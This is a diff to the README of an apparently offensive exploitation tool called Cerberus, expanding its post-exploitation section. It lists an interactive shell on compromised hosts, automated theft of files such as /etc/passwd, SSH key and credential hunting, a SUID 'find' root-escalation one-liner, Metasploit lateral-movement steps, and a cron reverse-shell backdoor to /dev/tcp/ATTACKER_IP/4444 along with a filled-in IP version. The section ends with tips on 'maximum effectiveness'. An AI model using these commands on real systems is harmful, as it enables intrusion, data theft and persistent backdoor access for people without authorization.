@@ -106,21 +106,138 @@ Comprehensive parameter testing across:
 - **Capability Discovery**: `getcap -r /` capability enumeration
 - **Writable File Identification**: System file permission analysis
 
-## Post-Exploitation Menu
+### Post-Exploitation Menu
 
-### Interactive Features
-- **Real Interactive Shell**: Fully functional command execution interface
-- **Data Exfiltration**: Automated collection of sensitive files and configurations
-- **System Intelligence**: Comprehensive system information gathering
-- **Network Reconnaissance**: Internal network mapping and service discovery
-- **Lateral Movement**: SSH key discovery, credential harvesting, internal exploitation
-- **Persistence Mechanisms**: Cron jobs, backdoor deployment, service installation
+![20868D7B-209C-4318-B2FF-14A7E0FB83C5](https://github.com/user-attachments/assets/fbd79a85-23bb-4e78-a773-7e65dca50866)
 
-### Data Collection
-- **System Information**: Kernel, CPU, memory, disk usage, processes
-- **Network Intelligence**: Interfaces, routing, ARP tables, active connections
-- **Sensitive Files**: Password files, configuration files, SSH keys, database dumps
-- **User Data**: Home directories, browser data, application configurations
+### **Interactive Features That Work Immediately**
+
+#### **Interactive Shell** 
+**Status: FULLY FUNCTIONAL**
+- Once RCE is established, you get a fully working shell interface
+- Execute any system commands directly on the compromised target
+- Perfect for real-time exploration and manual testing
+
+#### **Data Exfiltration**
+**Status: FULLY FUNCTIONAL**
+- Automatically extracts and saves sensitive system files:
+  - `/etc/passwd`, `/etc/hosts`, `/proc/version`
+  - Network configurations and system information
+- Creates timestamped reports with all extracted data
+- Files saved as: `exfiltrated_data_[target]_[timestamp].txt`
+
+#### **System Intelligence Gathering**
+**Status: FULLY FUNCTIONAL**
+- Live system reconnaissance:
+  - Kernel information: `uname -a`
+  - CPU and memory details: `cat /proc/cpuinfo`, `free -h`
+  - Disk usage: `df -h`
+  - Running processes: `ps aux`
+  - Current user context: `whoami && id`
+
+#### **Network Reconnaissance**
+**Status: CONDITIONAL (Depends on target system)**
+- Internal network mapping:
+  - Network interfaces: `ifconfig || ip addr`
+  - Routing tables: `route -n || ip route`
+  - ARP tables and active connections
+- **Note**: Requires basic networking tools on target system
+
+### **Advanced Features Requiring User Action**
+
+#### **Privilege Escalation**
+**Detection: FULLY FUNCTIONAL | Exploitation: GUIDED**
+- **What Works Automatically**:
+  - Finds all SUID binaries: `find / -perm -4000`
+  - Checks sudo permissions: `sudo -l`
+  - Identifies cron jobs and capabilities
+- **What Requires Manual Intervention**:
+  - When exploitable binaries are found (bash, find, nmap, vim, etc.), Cerberus provides the exploitation commands
+  - **You must manually execute** the provided exploit commands in the interactive shell
+  - Example: If `/usr/bin/find` is SUID, use: `find . -exec /bin/sh \; -quit`
+
+#### **Lateral Movement**
+**Status: RECONNAISSANCE ONLY**
+- **What Cerberus Provides**:
+  - Finds potential lateral movement vectors:
+    - SSH keys: `find /home /root -name '.ssh' -type d`
+    - Private keys: `find / -name '*.pem' -o -name 'id_rsa'`
+    - Configuration files and credentials
+- **What You Need to Do**:
+  - **Manually use** discovered SSH keys or credentials
+  - **Set up** SSH connections to other systems manually
+  - **Configure** tools like Metasploit or custom scripts for actual lateral movement
+
+#### **Persistence Mechanisms**
+**Status: TEMPLATE-BASED**
+- **What Cerberus Provides**:
+  - Persistence templates and concepts:
+    - Cron job backdoors
+    - Reverse shell persistence
+    - Service-based backdoors
+- **What You Need to Do**:
+  - **Replace placeholders** in persistence commands:
+    ```bash
+    # CHANGE THIS: Cerberus provides template
+    */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+    
+    # TO THIS: You manually update with your IP
+    */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
+    ```
+  - **Manually execute** persistence commands in the interactive shell
+  - **Verify** backdoors are properly installed and working
+
+###  **User Workflow for Advanced Features**
+
+#### For Privilege Escalation:
+1. Run privilege escalation detection in Cerberus
+2. **Copy** the provided exploit commands
+3. **Paste and execute** them in the interactive shell
+4. **Verify** root access with `whoami`
+
+#### For Lateral Movement:
+1. Use Cerberus to find SSH keys and credentials
+2. **Manually copy** discovered keys to your attacker machine
+3. **Use standard tools** for lateral movement:
+   ```bash
+   # Manual SSH with discovered key
+   ssh -i discovered_key.pem user@internal_ip
+   
+   # Or use in Metasploit
+   use auxiliary/scanner/ssh/ssh_login
+   set RHOSTS internal_subnet
+   set USERNAME discovered_user
+   set KEY_PATH discovered_key.pem
+   ```
+
+#### For Persistence:
+1. Get persistence templates from Cerberus
+2. **Customize** with your actual IP and ports
+3. **Execute manually** in the interactive shell
+4. **Test** persistence mechanisms from your machine
+
+### **Quick Reference - What Works Out of the Box**
+
+| Feature           | Status| User Action Required     |
+|-------------------|-------|--------------------------|
+| Interactive Shell |  Full | None                     |
+| Data Exfiltration |  Full | None                     |
+| System Recon      |  Full | None                     |
+| Network Recon     | Condt | None (if tools exist)    |
+| PrivEsc Detection |  Full | None                     |
+| PrivEsc Exploit   |Guided | Manual command execution |
+| Lateral Mvmt Disc |  Full | Manual exploitation      |
+| Prstst tmplt      | Basic | Full customization       |
+
+### **Pro Tips for Maximum Effectiveness**
+
+1. **Start with the interactive shell** - it's the most reliable feature
+2. **Use data exfiltration first** to understand the target environment
+3. **For privilege escalation**: Copy Cerberus findings and use them with tools like LinPEAS or manual exploitation
+4. **For lateral movement**: Combine Cerberus findings with standard penetration testing tools
+5. **Always verify** persistence mechanisms work before relying on them
+
+---
 
 ## Output and Reporting
 
